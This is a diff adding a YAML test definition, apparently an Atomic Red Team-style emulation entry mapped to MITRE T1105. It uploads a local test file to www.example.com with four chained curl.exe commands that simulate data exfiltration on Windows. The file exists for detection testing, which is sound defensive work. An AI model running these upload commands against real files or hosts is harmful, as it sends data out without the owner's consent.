@@ -1,0 +1,22 @@
+- description: 'The following Atomic utilizes native curl.exe, or downloads it if
+    not installed, to upload a txt file to simulate data exfiltration
+
+    Expected output will include whether the file uploaded successfully or not.
+
+    '
+  id: b2f0ed53-97bc-4f59-0464-8d9a5fda7939
+  name: Curl Upload File
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com
+          && C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt
+          www.example.com && C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt
+          www.example.com && C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt
+          www.example.com
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
